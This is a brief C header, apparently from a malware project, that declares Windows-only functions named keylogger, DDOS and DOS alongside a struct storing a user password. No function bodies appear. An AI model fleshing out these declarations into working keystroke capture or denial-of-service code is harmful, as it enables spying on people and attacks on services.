#ifndef CXENON_H
#define CXENON_H

#include <../Include/driver/socket.h>

#if defined(_WIN32)

char* keylogger(void);
void DDOS(void);
void DOS(void);

enum USTATUS
{

	ONLINE,
	OFFLINE,
	UNKNOWN

};

typedef struct
{

	char password[255];
	enum USTATUS STATUS;

} userinfo;

#endif